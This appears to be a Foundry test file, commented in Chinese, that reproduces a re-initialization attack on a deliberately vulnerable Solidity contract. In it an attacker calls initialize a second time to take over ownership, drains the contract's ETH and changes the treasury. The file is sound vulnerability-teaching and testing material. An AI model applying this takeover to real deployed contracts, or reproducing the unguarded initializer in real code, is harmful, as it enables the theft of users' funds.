// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/vulns/D17_BadInit.sol";

contract D17_BadInit_AttackTest is Test {
    D17_BadInit bad;

    address alice = address(0xA11CE);
    address attacker = address(0xB0B);
    address aliceTreasury = address(0xAA01);
    address attackerTreasury = address(0xBB01);

    function setUp() public {
        bad = new D17_BadInit();
    }

    /// @notice 攻击复现：initialize 可重复调用 -> attacker 二次 initialize 夺取 owner
    function test_attack_reinitialize_takesOverOwner() public {
        // 1) 正常流程：alice 初始化为 owner
        vm.prank(alice);
        bad.initialize(alice, aliceTreasury);

        assertEq(bad.owner(), alice);
        assertEq(bad.treasury(), aliceTreasury);

        // 2) 攻击者：再次 initialize，把 owner/treasury 覆盖成自己
        vm.prank(attacker);
        bad.initialize(attacker, attackerTreasury);

        // 3) 夺权成功：owner/treasury 被覆盖
        assertEq(bad.owner(), attacker);
        assertEq(bad.treasury(), attackerTreasury);
    }

    /// @notice 攻击危害演示：夺权后可把合约 ETH sweep 到 attackerTreasury
    function test_attack_sweepETH_after_takeover() public {
        // 1) alice 初始化
        vm.prank(alice);
        bad.initialize(alice, aliceTreasury);

        // 2) 给合约打点 ETH（模拟合约里有资金）
        vm.deal(address(this), 10 ether);
        (bool ok, ) = address(bad).call{value: 5 ether}("");
        require(ok, "fund failed");
        assertEq(address(bad).balance, 5 ether);

        // 3) attacker 重复 initialize 夺权 + 设置自己的 treasury
        vm.prank(attacker);
        bad.initialize(attacker, attackerTreasury);

        // 4) 夺权后 sweepETH，把合约余额转走
        uint256 before = attackerTreasury.balance;
        vm.prank(attacker);
        bad.sweepETH();
        assertEq(address(bad).balance, 0);
        assertEq(attackerTreasury.balance, before + 5 ether);
    }

    /// @notice 证明“只有 owner 能 setTreasury”，但夺权后 attacker 也能改
    function test_attack_setTreasury_after_takeover() public {
        // alice 初始化
        vm.prank(alice);
        bad.initialize(alice, aliceTreasury);

        // attacker 直接 setTreasury（此时还不是 owner）应当失败
        vm.prank(attacker);
        vm.expectRevert("not owner");
        bad.setTreasury(attackerTreasury);

        // attacker 夺权
        vm.prank(attacker);
        bad.initialize(attacker, attackerTreasury);

        // attacker 现在是 owner，可以改 treasury
        address newTreasury = address(0xBB02);
        vm.prank(attacker);
        bad.setTreasury(newTreasury);

        assertEq(bad.treasury(), newTreasury);
    }

    // 让本测试合约能接收 ETH（vm.deal + call 转账更顺）
    receive() external payable {}
}
